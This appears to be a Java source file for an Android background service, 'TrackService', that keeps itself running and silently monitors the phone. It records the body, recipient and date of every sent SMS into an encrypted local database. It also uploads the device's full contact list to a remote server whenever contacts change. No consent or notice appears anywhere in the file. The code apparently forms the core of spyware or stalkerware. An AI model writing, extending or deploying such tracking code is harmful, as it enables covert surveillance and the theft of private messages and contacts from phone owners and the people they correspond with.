package com.sunnet.service.service;

import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Contacts;
import android.provider.Telephony;
import android.support.annotation.Nullable;

import com.sunnet.service.db.DatabaseHelper;
import com.sunnet.service.db.entity.ContactEntity;
import com.sunnet.service.db.entity.SMSEntity;
import com.sunnet.service.log.Log;
import com.sunnet.service.task.request.RequestHelper;
import com.sunnet.service.util.SharedPreferencesUtility;
import com.sunnet.service.util.Utils;

import java.util.List;

public class TrackService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e(TrackService.class.getName() + " onStartCommand");

        return START_STICKY;
//        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.e(TrackService.class.getName() + " create");
        //-- Listener change sms sent
        getContentResolver().registerContentObserver(Uri.parse("content://sms/out"), true,
                new ContentObserver(new Handler()) {
                    @Override
                    public boolean deliverSelfNotifications() {
                        return super.deliverSelfNotifications();
                    }

                    @Override
                    public void onChange(boolean selfChange) {
                        super.onChange(selfChange);
                        //Toast.makeText(MyApplication.getContext(), "sms change", Toast.LENGTH_LONG).show();

                        Cursor cursor = getContentResolver().query(
                                Uri.parse("content://sms"), null, null, null, null);
                        if (cursor.moveToNext()) {
                            String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
                            int type = cursor.getInt(cursor.getColumnIndex("type"));
                            // Only processing outgoing sms event & only when it
                            // is sent successfully (available in SENT box).
                            if (protocol != null || type != Telephony.TextBasedSmsColumns.MESSAGE_TYPE_SENT) {
                                return;
                            }
                            int indexBody = cursor.getColumnIndex("body");
                            int indexAddress = cursor.getColumnIndex("address");
                            int indexDate = cursor.getColumnIndex("date");
                            String receiver = Utils.getPhoneNumber();
                            Log.i("SMS receiver: " + receiver);

                            SMSEntity entity = new SMSEntity();
                            entity.setType(0);
                            entity.setBody(cursor.getString(indexBody));
                            entity.setSender(cursor.getString(indexAddress));
                            entity.setReceiver(receiver);
                            entity.setDate(cursor.getString(indexDate));
                            entity.setId(cursor.getString(indexDate));
                            Log.i(entity.toString());

                            //-- Encrypt data before insert into database
                            entity.encrypt();
                            DatabaseHelper.createASms(entity);
                        }
                    }

                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        super.onChange(selfChange, uri);
                        //Toast.makeText(MyApplication.getContext(), "sms change " + uri.toString(), Toast.LENGTH_LONG).show();
                    }
                });
        //-- Listener change contact
        getContentResolver().registerContentObserver(
                Contacts.People.CONTENT_URI, true, new ContentObserver(new Handler()) {

                    private boolean isCallUpdate = false;

                    @Override
                    public boolean deliverSelfNotifications() {
                        return super.deliverSelfNotifications();
                    }

                    @Override
                    public void onChange(boolean selfChange) {
                        super.onChange(selfChange);
                        SharedPreferencesUtility.getInstance().putBoolean(
                                SharedPreferencesUtility.CONTACT_CHANGED, selfChange);
                        //Toast.makeText(MyApplication.getContext(), "Contact change", Toast.LENGTH_LONG).show();
                        if (!isCallUpdate) {
                            isCallUpdate = true;
                            //-- Upload contact - get data from Database
                            if (SharedPreferencesUtility.getInstance().getBoolean(SharedPreferencesUtility.CONTACT_CHANGED, true)) {
                                List<ContactEntity> contactList = DatabaseHelper.getAllContactFromDevice();
                                Log.i("Contact list change: " + (contactList != null ? contactList.size() : 0));
                                RequestHelper.updateContactToServer(contactList);
                            }
                        }
                    }

                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        super.onChange(selfChange, uri);
                        //Toast.makeText(MyApplication.getContext(), "Contact change " + uri.toString(), Toast.LENGTH_LONG).show();
                        SharedPreferencesUtility.getInstance().putBoolean(
                                SharedPreferencesUtility.CONTACT_CHANGED, selfChange);
                        if (!isCallUpdate) {
                            isCallUpdate = true;
                            //-- Upload contact - get data from Database
                            if (SharedPreferencesUtility.getInstance().getBoolean(SharedPreferencesUtility.CONTACT_CHANGED, true)) {
                                List<ContactEntity> contactList = DatabaseHelper.getAllContactFromDevice();
                                Log.i("Contact list change: " + (contactList != null ? contactList.size() : 0));
                                RequestHelper.updateContactToServer(contactList);
                            }
                        }
                    }
                }
        );
    }
}
